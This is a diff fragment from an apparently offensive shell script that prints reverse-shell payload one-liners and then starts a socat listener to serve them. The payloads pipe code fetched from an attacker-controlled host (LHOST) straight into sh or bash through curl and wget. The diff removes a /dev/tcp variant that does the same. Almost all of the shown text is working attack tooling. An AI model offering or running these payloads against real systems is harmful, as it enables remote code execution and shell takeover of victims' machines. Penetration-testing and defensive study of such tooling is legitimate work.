@@ -79,6 +79,5 @@ echo "[+] Reverse shell payload:"
 echo "curl ${LHOST}:${WEBPORT}|sh"
 echo "curl ${LHOST}:${WEBPORT}|bash"
 echo "wget -q -O - ${LHOST}:${WEBPORT}|bash"
-echo "exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e \"GET / HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n\" >&3; cat <&3 | sed -e '1,7d' |bash"
 
 socat TCP4-LISTEN:${LPORT},reuseaddr,fork EXEC:./socat-forker.sh,pty,echo=0
